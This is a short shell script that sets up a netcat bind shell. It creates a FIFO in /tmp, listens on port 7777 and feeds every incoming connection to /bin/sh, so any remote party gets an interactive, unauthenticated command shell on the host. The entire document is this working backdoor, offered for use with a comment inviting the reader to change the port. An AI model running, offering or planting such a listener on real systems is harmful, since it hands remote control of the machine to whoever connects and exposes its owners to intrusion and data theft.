#!/bin/sh
#PORT the port you want to listen on
PORT=7777      # change port no here
mkfifo /tmp/f; nc -lvnp $PORT < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f;
